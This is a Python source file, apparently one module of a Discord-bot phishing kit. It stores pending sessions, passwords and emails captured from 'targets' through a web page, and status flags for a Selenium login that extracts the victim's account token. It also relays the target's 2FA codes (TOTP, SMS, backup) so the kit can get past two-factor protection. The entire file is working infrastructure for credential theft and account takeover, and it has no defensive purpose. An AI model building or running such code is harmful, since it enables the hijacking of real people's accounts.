# oauth_store.py
# Thread-safe in-memory store for pending OAuth sessions and captured credentials.
# Shared between the aiohttp web server thread and the discord bot's asyncio event loop.
# CPython's GIL ensures dict reads/writes are atomic for simple operations.

import threading

_lock = threading.Lock()

# ── Session registry ───────────────────────────────────────────────────────────
# page_id (str) -> discord user id (int)
_sessions: dict[str, int] = {}

# ── Credential store ───────────────────────────────────────────────────────────
# page_id (str) -> {"email": str, "password": str}
_pending_credentials: dict[str, dict] = {}

# ── Per-session status ─────────────────────────────────────────────────────────
# Possible values:
#   "waiting_creds"   – link generated, waiting for target to submit credentials
#   "processing"      – credentials received, Selenium is attempting login
#   "2fa_required"    – Selenium detected 2FA; waiting for code from the web page
#   "done"            – token extracted successfully
#   "failed"          – login or extraction failed
_status: dict[str, str] = {}

# ── 2FA metadata ───────────────────────────────────────────────────────────────
# page_id -> list of available method strings, e.g. ["totp", "sms", "backup"]
_2fa_types: dict[str, list[str]] = {}

# page_id -> {"code": str, "method": str}  (submitted by the target via the web form)
_2fa_codes: dict[str, dict] = {}

# ── 2FA error (e.g. wrong code) ────────────────────────────────────────────────
# page_id -> error message string
_2fa_errors: dict[str, str] = {}


# ──────────────────────────────────────────────────────────────────────────────
# Session management
# ──────────────────────────────────────────────────────────────────────────────

def create_session(page_id: str, discord_user_id: int) -> None:
    with _lock:
        _sessions[page_id] = discord_user_id
        _status[page_id] = "waiting_creds"


def get_discord_user_id(page_id: str) -> int | None:
    with _lock:
        return _sessions.get(page_id)


def remove_session(page_id: str) -> None:
    with _lock:
        for store in (
            _sessions, _pending_credentials, _status,
            _2fa_types, _2fa_codes, _2fa_errors,
        ):
            store.pop(page_id, None)


# ──────────────────────────────────────────────────────────────────────────────
# Credential store
# ──────────────────────────────────────────────────────────────────────────────

def store_credentials(page_id: str, email: str, password: str) -> bool:
    """Store captured credentials and advance status to 'processing'.
    Returns True if the session exists, False otherwise."""
    with _lock:
        if page_id not in _sessions:
            return False
        _pending_credentials[page_id] = {"email": email, "password": password}
        _status[page_id] = "processing"
        return True


def pop_credentials(page_id: str) -> dict | None:
    """Return and remove credentials for a page_id, or None if not ready."""
    with _lock:
        return _pending_credentials.pop(page_id, None)


def has_credentials(page_id: str) -> bool:
    with _lock:
        return page_id in _pending_credentials


# ──────────────────────────────────────────────────────────────────────────────
# Status management
# ──────────────────────────────────────────────────────────────────────────────

def set_status(page_id: str, status: str) -> None:
    with _lock:
        _status[page_id] = status


def get_status(page_id: str) -> str:
    with _lock:
        return _status.get(page_id, "unknown")


# ──────────────────────────────────────────────────────────────────────────────
# 2FA management
# ──────────────────────────────────────────────────────────────────────────────

def set_2fa_required(page_id: str, types: list[str]) -> None:
    """Called by Selenium when it detects a 2FA challenge.
    `types` is an ordered list of available methods, e.g. ['totp', 'sms', 'backup']."""
    with _lock:
        _2fa_types[page_id] = types
        _status[page_id] = "2fa_required"


def get_2fa_types(page_id: str) -> list[str]:
    with _lock:
        return list(_2fa_types.get(page_id, []))


def store_2fa_code(page_id: str, code: str, method: str) -> bool:
    """Store the 2FA code submitted by the target via the web form.
    Returns True if the session exists and is in 2fa_required state."""
    with _lock:
        if _status.get(page_id) != "2fa_required":
            return False
        _2fa_codes[page_id] = {"code": code.strip(), "method": method}
        _2fa_errors.pop(page_id, None)
        return True


def pop_2fa_code(page_id: str) -> dict | None:
    """Return and remove the submitted 2FA code, or None if not ready."""
    with _lock:
        return _2fa_codes.pop(page_id, None)


def has_2fa_code(page_id: str) -> bool:
    with _lock:
        return page_id in _2fa_codes


def set_2fa_error(page_id: str, message: str) -> None:
    """Signal to the web page that the submitted code was wrong."""
    with _lock:
        _2fa_errors[page_id] = message
        _status[page_id] = "2fa_required"


def pop_2fa_error(page_id: str) -> str | None:
    with _lock:
        return _2fa_errors.pop(page_id, None)
